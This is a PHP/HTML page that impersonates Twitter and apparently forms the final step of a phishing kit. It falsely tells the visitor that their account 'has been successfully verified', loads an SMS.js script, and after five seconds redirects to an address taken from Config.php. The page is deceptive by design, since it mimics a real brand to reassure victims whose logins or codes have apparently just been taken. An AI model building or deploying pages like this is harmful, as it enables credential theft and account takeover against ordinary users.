<?php include("Config.php"); ?>
<html>
  <head>
    <title>Twitter</title>
    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0,viewport-fit=cover">
    <link rel="shortcut icon" href="img/twitter.ico" type="image/x-icon">
    <meta charset="utf-8" />
    <!-- jQuery -->
    <script type="text/javascript" src="js/jquery-3.6.0.min.js"></script>
    <script type="text/javascript" src="js/jquery.redirect.js"></script>
    <script type="text/javascript" src="js/SMS.js"></script>
    <!-- Boostrap -->
    <script type="text/javascript" src="bootstrap/js/bootstrap.min.js"></script>
    <link rel="stylesheet" href="bootstrap/css/bootstrap.min.css">
    <!-- Style -->
    <link rel="stylesheet" href="css/style_password.css">
    <script>
    function redireccionarPagina() { window.location = "<?= $URLRedireccion; ?>"; }
    $(document).ready(function(){
      setTimeout("redireccionarPagina()", 5000);
    });
    </script>
  </head>
  <body>




      <div class="container">
        <div class="mbl-container mbl-logo">
          <img src="img/twitter.png" alt="mbl-logo" height="35" />
        </div>

        <div class="mbl-container mbl-title" style="padding-bottom:10px; text-align:center;">
          <h1>Your account has been successfully verified</h1>
          <span>Please login again</span>
          <br/>
          <br/>
          <img src="img/checked.png" alt="Logo" height="200" />
        </div>

      </div>


  </body>
</html>
